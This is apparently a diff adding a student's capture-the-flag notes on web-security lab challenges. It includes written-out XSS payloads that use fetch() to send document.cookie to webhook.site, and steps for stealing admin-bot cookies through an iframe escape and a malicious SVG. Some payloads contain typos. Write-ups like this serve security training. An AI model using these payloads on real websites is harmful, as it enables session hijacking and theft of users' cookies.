@@ -1,0 +1,54 @@
+[NONNA RECIPES]
+1) <img src"1" onerror=fetch( "https://webhook.site/ce3ad957-cf4e-4cca-a5c8-f4478f521d28?c="+dpcument.cookie)\>
+2) then the link returned on the url bar (https://195a4f91-a794-43d8-a42d-dd23809180f6.offsec.m0lecon.it/?q=%3Cimg+src%3Dx+onerror%3Dfetch%28%22https%3A%2F%2Fwebhook.site%2F20306ec0-6134-4f4d-ba34-ae049c7db64c%3Fc%3D%22%2Bdocument.cookie%29%3E) is sended to the "share with nonna section"
+3) check on webhook the incoming "messages" and take the flag
+#------------------------------------------------------------------------------#
+
+[PHP NOTES]
+0)use  ` (backtick) to escape to the sanitization
+1)</script><script>fetch(`https://webhook.site/ce3ad957-cf4e-4cca-a5c8-f4478f521d28?c=`+document.cookie)</script>
+2)https://76e91b99-4e19-4d47-89b3-196ee049cb5e.offsec.m0lecon.it/view.php?id=10
+3)see on webhook
+#------------------------------------------------------------------------------#
+
+[GUESTBOOK]
+
+0)use  ` (backtick) to escape to the sanitization of "
+0)use javascript on the "onerro"
+#------------------------------------------------------------------------------#
+
+
+[PIGION MAIL]
+The idea here is to escape from the sandboxed iframe in order to perform a fetch to webhook that include the cookie(flag) this is enable by the "report suspicius" form, which navigate arbitrary link.
+
+So we can craft a webpage that contains the payload ( https://s337251.github.io/PigeonPost/index.html ) and send it to the "report suspicius" form, at that point the payload create a new (not sandboxed) <iframe> in wich we perform the fetch to wehbook (+ document.cookie), then in the webhook site we have the cookie.
+
+1) Craft a webpage (GitHub Pages) that contains the payload
+2) Send the webpage link to the report suspicius" form, so the server (admin) navigate
+3) The payload poerform fetch to webhook including de cookie
+	("https://webhook.site/8ed59213-f222-49d8-929a-c06099b36de1?c=" + document.cookie)
+4) In webook websit we can se the cookie(flag)
+
+
+
+
+https://webhook.site/3f082e4a-3b00-4328-9b0d-e0f638e44cd9?c=flag=offsec{p0stm3ssag3_n0_0r1g1n_6my7QlhFjgu5xMsV}
+
+#------------------------------------------------------------------------------#
+[PicShare]
+The vulnerability here is how the svg are treated, in fact the content of the images are considered thrusted.
+Another key vulnerability is the "review" field in which the server navigate into a user input link
+The idea is to exploit it by modify create a new "profile" and loading a crafted svg that do a fetch on webhook,
+then send the link of these image into the "review field" so the admin will navigate into the malicius svg that redirect it to webhook stealing the document.cookie, so i can read it throut webhook.
+
+1)Create and load a crafted svg (present in the folder) 
+
+2)Upload the malicious svg on the Platform
+3)Send the Platform link of the malicius svg 
+4)See the session cookie on the webhook
+5)Use the session cookie to visit /admin/api/flag
+
+
+
+
+
